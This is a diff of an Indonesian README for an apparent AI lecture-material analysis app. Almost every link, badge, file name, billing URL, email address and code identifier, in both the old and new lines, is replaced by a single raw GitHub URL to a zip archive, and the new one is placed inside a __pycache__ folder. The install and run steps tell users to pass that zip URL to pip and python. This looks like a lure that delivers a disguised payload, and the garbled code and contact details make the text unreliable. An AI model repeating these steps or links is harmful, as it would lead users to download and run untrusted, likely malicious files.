@@ -2,10 +2,10 @@
 
 > **Sistem berbasis AI untuk menganalisis, menyederhanakan, dan memahami materi kuliah dengan lebih efektif**
 
-[![Python Version](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
-[![Gradio](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
-[![OpenAI](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)
-[![License](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip)](LICENSE)
+[![Python Version](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)
+[![Gradio](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip+https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)
+[![OpenAI](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)
+[![License](https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip)](LICENSE)
 
 ## ✨ Fitur Utama
 
@@ -68,7 +68,7 @@ source venv/bin/activate
 
 3. **Install Dependencies**
 ```bash
-pip install -r https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+pip install -r https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 ```
 
 4. **Setup API Key**
@@ -79,19 +79,19 @@ OPENAI_API_KEY=sk-proj-your-api-key-here
 ```
 
 **Cara mendapatkan API Key:**
-- Kunjungi: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+- Kunjungi: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 - Login/Register
 - Create new API key
 - Copy dan paste ke `.env`
 
 5. **Test Configuration**
 ```bash
-python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 ```
 
 6. **Run Application**
 ```bash
-python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+python https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 ```
 
 Aplikasi akan berjalan di: `http://localhost:7860`
@@ -101,19 +101,19 @@ Aplikasi akan berjalan di: `http://localhost:7860`
 ```
 analisis-materi-kuliah/
 │
-├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                          # Aplikasi Gradio utama
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip                          # Aplikasi Gradio utama
 ├── .env                            # API keys (jangan commit!)
-├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                # Dependencies
-├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                    # Script test API
-├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                     # Unit tests
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip                # Dependencies
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip                    # Script test API
+├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip                     # Unit tests
 │
 ├── utils/
-│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
-│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip             # Handler OpenAI API
-│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip          # Processor file & text
-│   └── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip       # Fitur tambahan
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip             # Handler OpenAI API
+│   ├── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip          # Processor file & text
+│   └── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip       # Fitur tambahan
 │
-└── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip                       # Dokumentasi ini
+└── https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip                       # Dokumentasi ini
 ```
 
 ## 💡 Cara Penggunaan
@@ -169,12 +169,12 @@ Recommended: 200+ kata untuk hasil optimal
 
 ### Pilih Model OpenAI
 
-Edit `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip`:
+Edit `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip`:
 
 ```python
 class LLMHandler:
     def __init__(self):
-        https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip = "gpt-4o-mini"  # Ganti di sini
+        https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip = "gpt-4o-mini"  # Ganti di sini
 ```
 
 **Pilihan Model:**
@@ -221,7 +221,7 @@ class LLMHandler:
 
 ### Error: "Insufficient Credits"
 **Solusi:**
-1. Cek billing: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+1. Cek billing: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 2. Tambah payment method
 3. Top up credits
 
@@ -244,14 +244,14 @@ class LLMHandler:
 ### Batch Processing
 ```python
 # Process multiple files
-files = ["https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip"]
+files = ["https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip", "https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip"]
 for file in files:
-    result = https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip(file, "ringkasan")
+    result = https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip(file, "ringkasan")
     save_result(result)
 ```
 
 ### Custom Prompts
-Edit prompts di `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip` untuk customize output style.
+Edit prompts di `https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip` untuk customize output style.
 
 ### Integration dengan Tools Lain
 - Export ke Notion
@@ -292,7 +292,7 @@ MIT License - lihat file LICENSE untuk detail
 
 Jika ada pertanyaan atau issues:
 - Open GitHub Issue
-- Email: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/previolation/Si-Paham-Paling-small.zip
+- Email: https://raw.githubusercontent.com/prasdionaditya/SiPaling-Paham/main/analisis-materi-kuliah/utils/__pycache__/Si-Paham-Paling-v3.2.zip
 - Discord: your-discord
 
 ## 🙏 Credits
